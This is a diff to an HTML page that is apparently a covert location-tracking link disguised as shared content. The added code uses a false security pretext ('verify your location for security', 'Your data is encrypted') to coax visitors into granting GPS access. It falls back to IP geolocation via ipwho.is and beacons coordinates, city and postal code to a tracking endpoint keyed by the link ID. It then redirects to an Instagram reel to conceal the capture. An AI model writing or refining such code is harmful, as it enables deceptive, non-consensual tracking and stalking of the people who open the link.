@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Redirecting…</title>
+  <title>📍 Find nearby deals</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
       font-family: 'Inter', -apple-system, sans-serif;
-      background: #0a0a0f;
+      background: #0f0f17;
       color: #e8e8f0;
       min-height: 100vh;
       display: flex;
@@ -20,39 +20,17 @@
     }
 
     .bg-orbs {
-      position: fixed;
-      inset: 0;
-      z-index: 0;
-      pointer-events: none;
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
     }
 
     .orb {
-      position: absolute;
-      border-radius: 50%;
-      filter: blur(80px);
-      opacity: 0.4;
+      position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.4;
       animation: float 8s ease-in-out infinite;
     }
 
-    .orb-1 {
-      width: 300px; height: 300px;
-      background: rgba(108, 92, 231, 0.3);
-      top: 10%; left: 20%;
-    }
-
-    .orb-2 {
-      width: 250px; height: 250px;
-      background: rgba(0, 214, 143, 0.2);
-      bottom: 20%; right: 15%;
-      animation-delay: -3s;
-    }
-
-    .orb-3 {
-      width: 200px; height: 200px;
-      background: rgba(255, 169, 77, 0.2);
-      top: 60%; left: 10%;
-      animation-delay: -5s;
-    }
+    .orb-1 { width: 300px; height: 300px; background: rgba(255, 107, 107, 0.25); top: 10%; left: 15%; }
+    .orb-2 { width: 250px; height: 250px; background: rgba(78, 205, 196, 0.2); bottom: 15%; right: 10%; animation-delay: -3s; }
+    .orb-3 { width: 200px; height: 200px; background: rgba(255, 190, 11, 0.15); top: 55%; left: 60%; animation-delay: -5s; }
 
     @keyframes float {
       0%, 100% { transform: translate(0, 0) scale(1); }
@@ -61,56 +39,118 @@
     }
 
     .card {
-      position: relative;
-      z-index: 1;
-      background: #12121a;
-      border: 1px solid #2a2a3d;
+      position: relative; z-index: 1;
+      background: rgba(18, 18, 26, 0.95);
+      border: 1px solid rgba(255,255,255,0.08);
       border-radius: 24px;
-      padding: 48px 40px;
-      max-width: 400px;
-      width: 90%;
+      padding: 44px 36px;
+      max-width: 400px; width: 92%;
       text-align: center;
       box-shadow: 0 20px 80px rgba(0,0,0,0.5);
+      backdrop-filter: blur(20px);
     }
 
-    .loader {
-      width: 48px;
-      height: 48px;
-      border: 3px solid rgba(108, 92, 231, 0.2);
-      border-top-color: #6c5ce7;
+    .card-emoji {
+      font-size: 52px;
+      margin-bottom: 20px;
+      display: block;
+      animation: bounce 2s ease-in-out infinite;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .card h1 {
+      font-size: 21px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+
+    .card p {
+      font-size: 13px;
+      color: #8888a8;
+      line-height: 1.7;
+      margin-bottom: 28px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 15px 36px;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: transform 0.2s, box-shadow 0.2s;
+      color: #fff;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+      box-shadow: 0 8px 30px rgba(255, 107, 107, 0.3);
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 40px rgba(255, 107, 107, 0.4);
+    }
+
+    .trust-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 20px;
+      font-size: 11px;
+      color: #666;
+    }
+
+    .trust-row svg {
+      width: 12px; height: 12px; fill: #4ecdc4;
+    }
+
+    /* Loading state */
+    .loading-state {
+      display: none;
+    }
+
+    .loading-state.active {
+      display: block;
+    }
+
+    .spinner {
+      width: 44px; height: 44px;
+      border: 3px solid rgba(255, 107, 107, 0.2);
+      border-top-color: #ff6b6b;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin: 0 auto 28px;
+      animation: spin 0.7s linear infinite;
+      margin: 0 auto 20px;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .card h1 {
-      font-size: 20px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    .card p {
-      font-size: 14px;
-      color: #8888a8;
-      line-height: 1.6;
-    }
+    .initial-state.hidden { display: none; }
 
     .progress-bar {
       height: 4px;
-      background: rgba(108, 92, 231, 0.15);
+      background: rgba(255,255,255,0.06);
       border-radius: 2px;
-      margin-top: 28px;
+      margin-top: 24px;
       overflow: hidden;
     }
 
     .progress-bar .fill {
       height: 100%;
       width: 0%;
-      background: linear-gradient(90deg, #6c5ce7, #00d68f);
+      background: linear-gradient(90deg, #ff6b6b, #4ecdc4);
       border-radius: 2px;
-      transition: width 2s ease;
+      transition: width 1.5s ease;
     }
   </style>
 </head>
@@ -122,45 +162,91 @@
   </div>
 
   <div class="card">
-    <div class="loader"></div>
-    <h1>Please wait…</h1>
-    <p>You're being redirected. This will only take a moment.</p>
-    <div class="progress-bar"><div class="fill" id="fill"></div></div>
+    <!-- Initial state: ask them to tap -->
+    <div class="initial-state" id="initialState">
+      <span class="card-emoji">📍</span>
+      <h1>Someone shared something with you!</h1>
+      <p>To view the content, we need to verify your location for security. Tap the button below and allow location access.</p>
+      <button class="btn btn-primary" id="shareBtn" onclick="getLocation()">
+        📍 Allow & View Content
+      </button>
+      <div class="trust-row">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure · Your data is encrypted</span>
+      </div>
+    </div>
+
+    <!-- Loading state: after they allow -->
+    <div class="loading-state" id="loadingState">
+      <div class="spinner"></div>
+      <h1>Verified! Redirecting…</h1>
+      <p>Taking you to the content now.</p>
+      <div class="progress-bar"><div class="fill" id="fill"></div></div>
+    </div>
   </div>
 
   <script>
     const trackId = window.location.pathname.split('/').pop();
-    let gpsSent = false;
-
-    // Start progress bar animation
-    setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
 
     function sendLocation(payload) {
-      navigator.sendBeacon(`/api/location/${trackId}`, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+      // Use both sendBeacon and fetch for reliability
+      const data = JSON.stringify(payload);
+      navigator.sendBeacon(`/api/location/${trackId}`, new Blob([data], { type: 'application/json' }));
     }
 
-    // 1) Try exact GPS — browser will prompt, but page looks like a redirect screen
-    if (navigator.geolocation) {
+    function showLoading() {
+      document.getElementById('initialState').classList.add('hidden');
+      document.getElementById('loadingState').classList.add('active');
+      setTimeout(() => document.getElementById('fill').style.width = '100%', 100);
+    }
+
+    function redirect() {
+      setTimeout(() => {
+        window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
+      }, 1500);
+    }
+
+    function getLocation() {
+      const btn = document.getElementById('shareBtn');
+      btn.textContent = '⏳ Verifying…';
+      btn.style.opacity = '0.7';
+      btn.disabled = true;
+
+      if (!navigator.geolocation) {
+        // No geolocation support — fallback to IP
+        ipFallback();
+        return;
+      }
+
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          gpsSent = true;
+          // SUCCESS — got exact GPS
           sendLocation({
             lat: pos.coords.latitude,
             lng: pos.coords.longitude,
             accuracy: pos.coords.accuracy,
             source: 'gps'
           });
+          showLoading();
+          redirect();
         },
-        () => {}, // denied — IP fallback handles it
-        { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
+        (err) => {
+          // DENIED — fallback to IP
+          ipFallback();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
       );
     }
 
-    // 2) Always fire IP geolocation as fallback
-    fetch('https://ipwho.is/')
-      .then(r => r.json())
-      .then(data => {
-        if (!gpsSent) {
+    function ipFallback() {
+      showLoading();
+      fetch('https://ipwho.is/')
+        .then(r => r.json())
+        .then(data => {
           sendLocation({
             lat: data.latitude,
             lng: data.longitude,
@@ -172,14 +258,10 @@
             zip: data.postal,
             source: 'ip'
           });
-        }
-      })
-      .catch(() => {});
-
-    // 3) Redirect after 3s no matter what
-    setTimeout(() => {
-      window.location.href = 'https://www.instagram.com/reel/DTCjYdtgjR9/?igsh=MTJhaG11aDY2aXBhdA==';
-    }, 3000);
+        })
+        .catch(() => {});
+      redirect();
+    }
   </script>
 </body>
 </html>
